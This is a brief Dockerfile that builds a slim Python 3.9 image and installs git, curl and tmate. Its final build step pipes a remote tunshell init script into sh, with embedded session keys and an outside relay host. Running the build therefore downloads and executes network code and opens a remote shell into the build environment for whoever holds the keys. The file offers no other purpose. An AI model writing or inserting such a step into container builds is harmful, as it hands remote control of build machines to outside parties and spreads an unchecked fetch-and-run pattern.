FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl tmate -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T UPaaLwH9RpVlhsB2bPk2Fm cxFsWf5bV6TpCddEBCKd9F eu.relay.tunshell.com
